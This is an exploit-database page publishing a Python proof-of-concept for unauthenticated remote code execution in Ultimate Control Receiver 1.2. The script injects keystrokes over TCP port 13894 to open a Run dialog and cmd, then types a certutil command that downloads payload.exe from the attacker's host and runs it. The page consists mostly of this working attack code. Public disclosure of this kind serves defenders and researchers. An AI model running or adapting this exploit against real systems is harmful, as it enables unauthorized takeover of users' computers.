---
title: Ultimate Control Receiver 1.2 Remote Code Execution
url: https://cxsecurity.com/issue/WLB-2025080003
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2025-08-06
fetch_date: 2025-10-07T00:17:51.212771
---

# Ultimate Control Receiver 1.2 Remote Code Execution

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **Ultimate Control Receiver 1.2 Remote Code Execution** **2025.08.05**  Credit:  **[Chokri](https://cxsecurity.com/author/Chokri/1/)**  Risk: **High**  Local: **No**  Remote: ****Yes****  CVE: **N/A**  CWE: **N/A** | |

# Exploit Title: Ultimate Control Receiver (v1.2) - Remote Code Execution
# Date: 2/08/2025
# Exploit Author: Chokri Hammedi
# Vendor Homepage: https://www.negusoft.com/
# Software Link: https://www.negusoft.com/ucontrol/downloads/pc.html
# Version: 1.2
# Tested on: Windows 10
'''
Description:
Ultimate Control Receiver v1.2 is vulnerable to unauthenticated remote code
execution. An attacker can exploit the keyboard input functionality over
TCP to execute arbitrary system commands on the target machine without user
interaction.
'''
import socket
import time
import struct
TARGET\_IP = "192.168.1.203"
TARGET\_PORT = 13894
LHOST = "192.168.1.63"
VK\_RETURN = 0x0D
VK\_LWIN = 0x5B
VK\_R = 0x52
def create\_type\_char\_message(character):
msg = bytearray(32)
msg[0] = 18
msg[1] = 18
char\_code = ord(character)
struct.pack\_into(">I", msg, 4, char\_code)
struct.pack\_into(">Q", msg, 24, int(time.time() \* 1000))
return msg
def create\_key\_input\_message(vk\_code, input\_type=0, command=False):
msg = bytearray(32)
msg[0] = 17
msg[1] = 17
flags = 1 << 4 if command else 0
msg[2] = flags
if input\_type == 0:
msg[3] = 0
elif input\_type == 1:
msg[3] = 3
elif input\_type == 2:
msg[3] = 1
struct.pack\_into(">I", msg, 4, vk\_code)
struct.pack\_into(">Q", msg, 24, int(time.time() \* 1000))
return msg
def send\_character(sock, character):
sock.send(create\_type\_char\_message(character))
time.sleep(0.05)
def send\_string(sock, text):
for char in text:
send\_character(sock, char)
def send\_win\_r():
with socket.socket(socket.AF\_INET, socket.SOCK\_STREAM) as s:
s.settimeout(5)
try:
s.connect((TARGET\_IP, TARGET\_PORT))
s.sendall(bytes([3, 3] + [0]\*30))
s.recv(32)
s.send(create\_key\_input\_message(VK\_LWIN, 2, True))
s.send(create\_key\_input\_message(VK\_R, 2, True))
s.send(create\_key\_input\_message(VK\_R, 1, True))
s.send(create\_key\_input\_message(VK\_LWIN, 1, True))
time.sleep(0.5)
return True
except Exception:
return False
def send\_cmd\_command():
with socket.socket(socket.AF\_INET, socket.SOCK\_STREAM) as s:
s.settimeout(10)
try:
s.connect((TARGET\_IP, TARGET\_PORT))
s.sendall(bytes([3, 3] + [0]\*30))
s.recv(32)
command = f"certutil -urlcache -f http://{LHOST}/payload.exe
\\windows\\temp\\payload.exe && \\windows\\temp\\payload.exe"
send\_string(s, command)
s.send(create\_key\_input\_message(VK\_RETURN))
return True
except Exception:
return False
def main():
if not send\_win\_r():
return
time.sleep(3)
with socket.socket(socket.AF\_INET, socket.SOCK\_STREAM) as s:
s.settimeout(10)
try:
s.connect((TARGET\_IP, TARGET\_PORT))
s.sendall(bytes([3, 3] + [0]\*30))
s.recv(32)
send\_string(s, "cmd")
s.send(create\_key\_input\_message(VK\_RETURN))
time.sleep(2)
except Exception:
return
time.sleep(3)
if not send\_cmd\_command():
return
if \_\_name\_\_ == "\_\_main\_\_":
main()

[**See this note in RAW Version**](https://cxsecurity.com/ascii/WLB-2025080003)

[Tweet](https://twitter.com/share)

Vote for this issue:
 1
 0

100%

0%

#### **Thanks for you vote!**

#### **Thanks for you comment!** Your message is in quarantine 48 hours.

Comment it here.

Nick (\*)

Email (\*)

Video

Text (\*)

(\*) - required fields.
Cancel
Submit

|  |  |
| --- | --- |
|  | **{{ x.nick }}** ![]() | Date: {{ x.ux \* 1000 | date:'yyyy-MM-dd' }} *{{ x.ux \* 1000 | date:'HH:mm' }}* CET+1  ---   {{ x.comment }} |

Show all comments

---

Copyright **2025**, cxsecurity.com

|  |

Back to Top